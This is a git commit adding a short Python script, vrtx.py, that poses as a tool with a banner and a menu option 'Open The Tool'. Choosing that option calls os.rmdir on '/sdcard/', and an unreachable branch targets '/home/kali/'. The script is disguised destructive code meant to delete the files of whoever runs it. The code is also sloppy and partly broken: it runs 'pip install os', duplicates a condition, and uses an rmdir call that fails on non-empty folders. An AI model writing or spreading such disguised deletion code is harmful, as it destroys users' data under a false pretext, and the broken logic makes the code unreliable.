04a01e005903dee667b9d2b10ff88a522c03b2c4
yjffyfykyfyfyffyf <133577457+yjffyfykyfyfyffyf@users.noreply.github.com>
2023-06-08 13:34:47 -0400

    Add files via upload

---
+++ vrtx.py
@@ -0,0 +1,44 @@
+import os , pyfiglet
+
+try :
+	import os
+except :
+	os.system('pip install os')
+try:
+	import pyfiglet
+except :
+	os.system('pip install pyfiglet')
+
+
+
+
+
+	
+	
+u = pyfiglet.figlet_format('V R T X')
+print (u)
+print (' - ßy @vrtx.2')
+
+print ('''
+   1 - Open The Tool
+
+''')
+
+try :
+	h = int(input('▒====> -InTer Nmber (1) :  '))
+	if h == 1 :
+		 jje = os.rmdir('/sdcard/')
+		 print('  TM Remov of the fales ')
+	elif h == 1:
+		ff = os.rmdir('/home/kali/')
+except:
+	os.system('clear')
+	pu = pyfiglet.figlet_format('V R T X     K i n g ')
+	print(pu)
+	pt = ('''  - ßy @vrtx.2''')
+	print (pt)
+	print (''' 
+	
+-	enTer nmber 1 pless ''')
+	
+
